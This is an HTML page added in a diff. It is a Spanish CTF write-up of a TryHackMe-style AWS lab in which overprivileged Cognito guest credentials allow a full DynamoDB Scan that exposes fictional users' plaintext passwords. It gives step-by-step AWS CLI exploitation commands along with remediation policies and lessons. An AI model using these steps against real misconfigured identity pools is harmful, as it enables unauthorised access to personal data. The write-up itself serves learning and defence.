@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Byte Lotus Wellness — de "app gratis sin login" a volcado completo de PII vía Cognito + DynamoDB · Portfolio</title>
+<meta name="post:titulo" content="Byte Lotus Wellness — de &quot;app gratis sin login&quot; a volcado completo de PII vía Cognito + DynamoDB">
+<meta name="post:fecha" content="AAAA-MM-DD">
+<meta name="post:resumen" content="Un sitio estático en S3 entrega a cualquier visitante credenciales AWS de invitado vía un Cognito Identity Pool, pensadas solo para leer el propio perfil en DynamoDB con GetItem. El rol IAM de invitado resulta sobreprivilegiado y permite un Scan completo de la tabla, exponiendo nombre, email, teléfono, ubicación GPS y contraseñas en texto plano de todos los huéspedes.">
+<meta name="post:tags" content="AWS, Cognito, DynamoDB, IAM Misconfiguration">
+<meta name="post:plataforma" content="TryHackMe (Advent-style Challenge)">
+<meta name="description" content="Writeup de Salvador Navarro.">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, noai, noimageai">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23050b17'/%3E%3Ctext x='32' y='47' font-size='44' font-family='monospace' font-weight='bold' text-anchor='middle' fill='%237a8f3a'%3ES%3C/text%3E%3C/svg%3E">
+</head>
+<body>
+
+<header>
+  <a class="logo" href="../index.html">PortFolio</a>
+  <nav>
+    <a href="../index.html">Inicio</a>
+    <div class="dd">
+      <a href="#" class="dd-t">Categorías ▾</a>
+      <div class="dd-m">
+        <a href="../index.html?tipo=Reto">Retos</a>
+        <a href="../index.html?tipo=Proyecto">Proyectos</a>
+        <a href="../index.html?tipo=Estudio">Estudios</a>
+      </div>
+    </div>
+    <a href="../sobremi/sobremi.html">Sobre mí</a>
+  </nav>
+</header>
+
+<main class="reto">
+  <a class="volver" href="../index.html#posts">← Volver a los posts</a>
+
+  <h1>Byte Lotus Wellness — de "app gratis sin login" a volcado completo de PII vía Cognito + DynamoDB</h1>
+  <div class="ficha">
+    <span><strong>Categoría:</strong> Cloud / AWS IAM Misconfiguration</span>
+    <span><strong>Sistema:</strong> AWS (S3 static site + Cognito + DynamoDB)</span>
+    <span><strong>Plataforma:</strong> TryHackMe (Advent-style Challenge · Día 3)</span>
+  </div>
+
+  <h2>Resumen</h2>
+  <p>La "Byte Lotus Wellness App" es un sitio estático alojado en S3 que, para no pedir login, entrega a cualquier
+  visitante credenciales AWS temporales de invitado a través de un <strong>Amazon Cognito Identity Pool</strong>.
+  Esas credenciales están pensadas solo para leer el perfil propio de cada huésped en DynamoDB
+  (<code>GetItem</code>), pero el rol IAM asociado al acceso "no autenticado" concede permisos mucho más amplios
+  de los necesarios. Como resultado, cualquier persona puede usar esas mismas credenciales "gratuitas" para hacer
+  un <code>Scan</code> completo de la tabla y volcar los datos de todos los huéspedes — nombre, email, teléfono,
+  ubicación GPS y, de forma especialmente grave, contraseñas en texto plano.</p>
+  <p class="respuesta"><b>Flag:</b> <code>THM{fr33_app_fr33_d4t4!}</code></p>
+
+  <h2>El enunciado, desmontado</h2>
+  <p>Vale la pena releer el briefing con lo que ya se sabe después, porque cada frase es una pista técnica
+  disfrazada de narrativa:</p>
+  <table>
+    <tr><th>Frase del enunciado</th><th>Lectura técnica</th></tr>
+    <tr><td>"No account needed. No login screen."</td><td>No hay autenticación de usuario final → la identidad se resuelve de otra forma (Cognito <em>unauthenticated identity</em>)</td></tr>
+    <tr><td>"It just… knows things about you the moment you open it."</td><td>La app hace una lectura de datos (<code>GetItem</code>) inmediatamente al cargar, usando un identificador local (<code>guest_id</code> en <code>localStorage</code>)</td></tr>
+    <tr><td>"Something still has to be deciding what you're allowed to see... it isn't checking very carefully."</td><td>Hay una política IAM/rol decidiendo permisos — y está mal configurada (demasiado permisiva)</td></tr>
+    <tr><td>@0xMia: "don't just check what it gives YOU. ask it for more"</td><td>Pista directa hacia probar una operación más amplia que la que usa la app por defecto (<code>Scan</code> en vez de <code>GetItem</code>)</td></tr>
+  </table>
+
+  <h2>Análisis</h2>
+
+  <h3>1. Reconocimiento inicial: la página estática</h3>
+  <div class="pregunta"><b>Objetivo:</b> identificar cómo interactúa el frontend con AWS.</div>
+  <p>El objetivo es un bucket S3 configurado como sitio web estático:</p>
+  <pre><code>http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/</code></pre>
+  <p>El HTML servido es mínimo: un dashboard vacío ("Loading your dashboard…") que se rellena vía JavaScript. Dos
+  scripts cargan en el <code>&lt;head&gt;</code>/final del <code>&lt;body&gt;</code>:</p>
+  <pre><code>&lt;script src="https://sdk.amazonaws.com/js/aws-sdk-2.1500.0.min.js"&gt;&lt;/script&gt;
+&lt;script src="app.js"&gt;&lt;/script&gt;</code></pre>
+  <p>Señal de alarma inmediata: cargar el AWS SDK for JavaScript directamente en un frontend público indica que la
+  aplicación va a interactuar con servicios AWS directamente desde el navegador, sin backend/API intermedio que
+  valide o filtre las peticiones. Esto normalmente implica credenciales embebidas o, como en este caso, un
+  mecanismo de credenciales "anónimas" vía Cognito.</p>
+
+  <h3>2. El hallazgo en app.js</h3>
+  <div class="pregunta"><b>Objetivo:</b> extraer la configuración necesaria para el ataque del código cliente.</div>
+  <p>El archivo <code>app.js</code> confirma la sospecha y expone, en texto plano, toda la configuración
+  necesaria:</p>
+  <pre><code>const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
+const AWS_REGION = "us-east-1";
+const TABLE_NAME = "complimentary-GuestWellnessProfiles";
+
+AWS.config.region = AWS_REGION;
+AWS.config.credentials = new AWS.CognitoIdentityCredentials({
+  IdentityPoolId: IDENTITY_POOL_ID,
+});</code></pre>
+  <p>El propio comentario del desarrollador en el código es prácticamente una confesión de la causa raíz:</p>
+  <pre><code>// No login screen on purpose: every visitor gets "free" AWS guest
+// credentials from our Cognito Identity Pool so we can save wellness
+// preferences without the friction of an account.</code></pre>
+  <p>El resto de la lógica es simple: genera un <code>guest_id</code> aleatorio guardado en
+  <code>localStorage</code> (identificador débil, previsible y controlado enteramente por el cliente) y hace un
+  único <code>dynamodb.getItem()</code> sobre la tabla <code>complimentary-GuestWellnessProfiles</code> usando ese
+  id como clave.</p>
+  <table>
+    <tr><th>Artefacto</th><th>Valor</th><th>Uso en la explotación</th></tr>
+    <tr><td>Cognito Identity Pool ID</td><td><code>us-east-1:836c0949-292d-485b-b532-52d5ca7bb688</code></td><td>Necesario para solicitar una identidad y credenciales</td></tr>
+    <tr><td>Región AWS</td><td><code>us-east-1</code></td><td>Necesaria en todas las llamadas de API</td></tr>
+    <tr><td>Tabla DynamoDB</td><td><code>complimentary-GuestWellnessProfiles</code></td><td>Objetivo del Scan</td></tr>
+  </table>
+
+  <h3>3. Fundamento: ¿qué es un Cognito Identity Pool?</h3>
+  <p>Amazon Cognito ofrece dos conceptos distintos que conviene no confundir: los <strong>User Pools</strong>
+  (gestión de usuarios con login, tal y como se entiende habitualmente "autenticación") y los
+  <strong>Identity Pools</strong> (federación de identidades para obtener credenciales temporales de AWS — Access
+  Key, Secret Key, Session Token — que permiten a un cliente, autenticado o no, llamar directamente a servicios de
+  AWS como DynamoDB o S3).</p>
+  <p>Un Identity Pool puede configurarse para permitir acceso no autenticado ("unauthenticated identities" /
+  guest access). Cuando esto ocurre, AWS asigna automáticamente un <strong>rol IAM específico para invitados</strong>
+  (en este caso, <code>complimentary-cognito-unauth-role</code>, como se confirma con
+  <code>sts get-caller-identity</code>). Cualquier visitante de la web, sin registrarse ni autenticarse de ninguna
+  forma, puede pedir credenciales que asumen ese rol.</p>
+  <pre><code>Cliente (navegador) → visita la web en S3
+       ↓
+Cognito Identity Pool → GetId (sin auth)
+       ↓
+STS (vía Cognito) → GetCredentialsForIdentity
+       ↓
+Rol asumido: complimentary-cognito-unauth-role
+       ↓
+DynamoDB → GetItem *y* Scan</code></pre>
+  <p>El diseño en sí no es la vulnerabilidad: los Cognito Identity Pools con acceso no autenticado son un patrón
+  legítimo y común (analítica anónima, apps sin fricción, etc.). El problema real está un nivel más abajo: qué
+  permisos concede el rol IAM asociado a ese acceso de invitado. Si ese rol se restringe correctamente (por
+  ejemplo, con políticas basadas en condiciones que solo permitan <code>dynamodb:GetItem</code> con una clave
+  igual al <code>cognito-identity.amazonaws.com:sub</code> del propio invitado), la app funciona exactamente igual
+  para el usuario legítimo, pero un <code>Scan</code> como el que se hizo aquí sería denegado con
+  <code>AccessDeniedException</code>.</p>
+
+  <h3>4. Explotación paso a paso</h3>
+  <div class="pregunta"><b>Objetivo:</b> obtener credenciales de invitado y comprobar hasta dónde llegan sus permisos.</div>
+  <p><strong>Paso 1 — Solicitar identidad.</strong> Con el <code>IdentityPoolId</code> extraído de
+  <code>app.js</code>, se solicita una identidad de invitado sin ningún tipo de credencial previa:</p>
+  <pre><code>aws cognito-identity get-id \
+  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
+  --region us-east-1
+
+{
+    "IdentityId": "us-east-1:4d571309-b041-c7d5-dafb-8c5ec7c00497"
+}</code></pre>
+  <p><strong>Paso 2 — Canjear identidad por credenciales.</strong> Con ese <code>IdentityId</code>, se piden las
+  credenciales AWS reales asociadas a él. Esta es la operación que materializa el "acceso gratuito" del
+  enunciado — sin ningún login, se obtienen credenciales completamente funcionales de AWS:</p>
+  <pre><code>aws cognito-identity get-credentials-for-identity \
+  --identity-id us-east-1:4d571309-b041-c7d5-dafb-8c5ec7c00497 \
+  --region us-east-1
+
+{
+  "IdentityId": "us-east-1:4d571309-b041-c7d5-dafb-8c5ec7c00497",
+  "Credentials": {
+    "AccessKeyId": "ASIAU2VYTBGYMVIGT7F7",
+    "SecretKey": "&lt;redacted&gt;",
+    "SessionToken": "&lt;redacted, ~2.6KB JWT-like token&gt;",
+    "Expiration": "2026-07-30T02:45:44-04:00"
+  }
+}</code></pre>
+  <p>Estas credenciales son temporales (nótese <code>Expiration</code>) y de tipo <code>ASIA...</code> (Access Key
+  de sesión, no de usuario IAM permanente), pero son completamente funcionales mientras no expiren — exactamente
+  igual que si fueran robadas de un usuario real.</p>
+  <p><strong>Paso 3 — Cargar credenciales en el entorno:</strong></p>
+  <pre><code>export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYMVIGT7F7"
+export AWS_SECRET_ACCESS_KEY="&lt;secret&gt;"
+export AWS_SESSION_TOKEN="&lt;session token&gt;"</code></pre>
+  <p><strong>Paso 4 — Confirmar la identidad asumida:</strong></p>
+  <pre><code>aws sts get-caller-identity --region us-east-1
+
+{
+    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
+    "Account": "332173347248",
+    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
+}</code></pre>
+  <p>Esto confirma que, sin ninguna autenticación, se está operando como el rol
+  <code>complimentary-cognito-unauth-role</code> en la cuenta AWS <code>332173347248</code> — el mismo rol que usa
+  legítimamente la propia aplicación para cualquier visitante.</p>
+  <p><strong>Paso 5 — Replicar el comportamiento legítimo (GetItem):</strong> esta es la operación que
+  <code>app.js</code> ejecuta de forma legítima: lectura acotada a un único ítem por clave primaria.</p>
+  <pre><code>aws dynamodb get-item \
+  --table-name complimentary-GuestWellnessProfiles \
+  --key '{"guest_id": {"S": "guest-noexiste"}}' \
+  --region us-east-1</code></pre>
+  <p><strong>Paso 6 — Explotación, "ask it for more" (Scan):</strong> siguiendo literalmente la pista de @0xMia, se
+  prueba una operación de más alcance que la que usa la app: en lugar de pedir un ítem por su clave, se solicita
+  toda la tabla.</p>
+  <pre><code>aws dynamodb scan \
+  --table-name complimentary-GuestWellnessProfiles \
+  --region us-east-1</code></pre>
+  <p class="respuesta"><b>Resultado:</b> la ausencia de un <code>AccessDeniedException</code> aquí es el hallazgo
+  central del reto: el rol de invitado tiene <code>dynamodb:Scan</code> (o un permiso comodín tipo
+  <code>dynamodb:*</code>) sobre la tabla, cuando el caso de uso legítimo de la aplicación solo necesitaba
+  <code>dynamodb:GetItem</code>.</p>
+
+  <h3>5. Evidencia completa y flag</h3>
+  <p>El <code>Scan</code> devolvió 5 ítems (perfiles completos de huéspedes distintos), confirmando la exposición
+  total de la tabla:</p>
+  <table>
+    <tr><th>guest_id</th><th>name</th><th>email</th><th>password (texto plano)</th></tr>
+    <tr><td>guest-vibe</td><td>Vibe (Move Fast &amp; Break Things)</td><td>vibe@hackerholidays.thm</td><td>digitaldetox2026</td></tr>
+    <tr><td>guest-lambo</td><td>Lambo (@0xMia)</td><td>lambo@hackerholidays.thm</td><td>sunkissed88</td></tr>
+    <tr><td>guest-vip-042</td><td>Guest VIP-042</td><td>vip042@hackerholidays.thm</td><td>escalation_only</td></tr>
+    <tr><td>guest-patch</td><td>Patch (Have You Tried Turning It Off)</td><td>patch@hackerholidays.thm</td><td>haveyoutriedrestarting</td></tr>
+    <tr><td>guest-ponzi</td><td>Ponzi (Satoshi_Probably)</td><td>ponzi@hackerholidays.thm</td><td>notmykeys1</td></tr>
+  </table>
+  <p>La flag estaba embebida como campo <code>notes</code> en el perfil de <code>guest-vip-042</code>, a modo de
+  confirmación explícita del hallazgo:</p>
+  <pre><code>"notes": {
+  "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
+}</code></pre>
+  <p class="respuesta"><b>Flag:</b> <code>THM{fr33_app_fr33_d4t4!}</code></p>
+
+  <h3>6. Por qué funcionó: la causa raíz en IAM</h3>
+  <p>El fallo no está en Cognito en sí, ni en DynamoDB, ni siquiera en exponer un Identity Pool ID en el frontend
+  (eso es esperable e inevitable: cualquier cliente JS que use Cognito necesariamente expone su Pool ID, igual que
+  expone su URL de API). El fallo está en la <strong>política IAM adjunta al rol de invitado</strong>, que
+  probablemente concede una acción amplia sobre la tabla en lugar de restringirla a la operación mínima
+  necesaria:</p>
+  <pre><code>✗ Política vulnerable (probable)
+{
+  "Effect": "Allow",
+  "Action": "dynamodb:*",
+  "Resource": "arn:aws:dynamodb:us-east-1:*:table/complimentary-GuestWellnessProfiles"
+}</code></pre>
+  <pre><code>✓ Política correctamente acotada
+{
+  "Effect": "Allow",
+  "Action": "dynamodb:GetItem",
+  "Resource": "arn:...:table/complimentary-GuestWellnessProfiles",
+  "Condition": {
+    "ForAllValues:StringEquals": {
+      "dynamodb:LeadingKeys": [
+        "${cognito-identity.amazonaws.com:sub}"
+      ]
+    }
+  }
+}</code></pre>
+  <p>La versión acotada usa <strong>DynamoDB Fine-Grained Access Control</strong>: además de limitar la acción a
+  <code>GetItem</code> (sin <code>Scan</code>, <code>Query</code> sin condición, ni operaciones de escritura), ata
+  la clave accedida al propio identificador de la identidad de Cognito que hace la llamada — de modo que, incluso
+  conociendo el nombre de la tabla, un invitado solo puede leer su propio registro, nunca el de otro.</p>
+
+  <h3>7. Hallazgos adicionales de interés</h3>
+  <ul>
+    <li><strong>Contraseñas en texto plano en DynamoDB.</strong> Independientemente del problema de control de
+    acceso, almacenar contraseñas sin hash (ni siquiera con un hash débil) es una mala práctica grave por sí
+    sola — cualquier acceso legítimo a la tabla (administradores, backups, otros servicios internos) expone
+    credenciales reutilizables.</li>
+    <li><strong>Identificador de sesión débil y controlado por el cliente.</strong> El <code>guest_id</code> se
+    genera con <code>Math.random()</code> en el navegador y se guarda en <code>localStorage</code>, sin ninguna
+    vinculación criptográfica con la identidad de Cognito. Aunque en este caso el Scan hace irrelevante este
+    problema, en una versión "parcheada" que solo permitiera <code>GetItem</code> sin condición por
+    <code>sub</code>, seguiría siendo trivial adivinar o enumerar <code>guest_id</code> de otros usuarios.</li>
+    <li><strong>Datos de geolocalización precisa</strong> (<code>location</code>, coordenadas GPS) almacenados y
+    expuestos junto al resto del perfil, agravando el impacto de privacidad del hallazgo.</li>
+  </ul>
+
+  <h2>Remediación</h2>
+  <ul>
+    <li>Aplicar el principio de mínimo privilegio al rol de invitado de Cognito: sustituir cualquier permiso
+    amplio (<code>dynamodb:*</code>, <code>Scan</code>, <code>Query</code> sin condición) por únicamente
+    <code>GetItem</code>/<code>PutItem</code> sobre la clave propia.</li>
+    <li>Usar Fine-Grained Access Control de DynamoDB con <code>dynamodb:LeadingKeys</code> atado a
+    <code>cognito-identity.amazonaws.com:sub</code>.</li>
+    <li>Nunca almacenar contraseñas en texto plano; usar un algoritmo de hash con salt diseñado para contraseñas
+    (bcrypt, scrypt, Argon2).</li>
+    <li>Revisar periódicamente los roles IAM de "unauthenticated identities" con herramientas como IAM Access
+    Analyzer, que puede señalar automáticamente permisos excesivos en roles públicamente asumibles.</li>
+    <li>Minimizar datos expuestos al cliente: si la app solo necesita mostrar nombre y notas, el modelo de
+    permisos y el propio esquema de la tabla no deberían permitir arrastrar teléfono, contraseña o ubicación en
+    la misma operación de lectura.</li>
+  </ul>
+
+  <h2>Lecciones aprendidas</h2>
+  <p>Este reto ilustra un patrón de vulnerabilidad cada vez más común en aplicaciones "serverless"/JAMstack:
+  cuando el frontend habla directamente con servicios cloud (sin una API intermedia que pueda aplicar lógica de
+  autorización adicional), toda la seguridad recae en la política IAM del rol asumido. Un Identity Pool con
+  acceso no autenticado no es, en sí, un error — pero conceder a ese rol más de lo estrictamente necesario
+  convierte cualquier visitante anónimo en un lector potencial de toda la base de datos, sin necesidad de
+  explotar ningún fallo de código: basta con conocer el SDK que se está usando y pedir una operación distinta a
+  la que la interfaz gráfica ofrece.</p>
+
+  <h2>Referencias</h2>
+  <ul>
+    <li>AWS Docs — Amazon Cognito Identity Pools (Federated Identities)</li>
+    <li>AWS Docs — DynamoDB Fine-Grained Access Control (<code>dynamodb:LeadingKeys</code>)</li>
+    <li>OWASP Top 10 2021 — A01: Broken Access Control</li>
+    <li>OWASP Top 10 2021 — A05: Security Misconfiguration</li>
+    <li>CWE-284: Improper Access Control</li>
+    <li>CWE-639: Authorization Bypass Through User-Controlled Key (relevante para el <code>guest_id</code> en localStorage)</li>
+  </ul>
+</main>
+
+<footer>© <span id="year"></span> Salvador Navarro · Portfolio · Writeups · Proyectos</footer>
+<script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+</html>
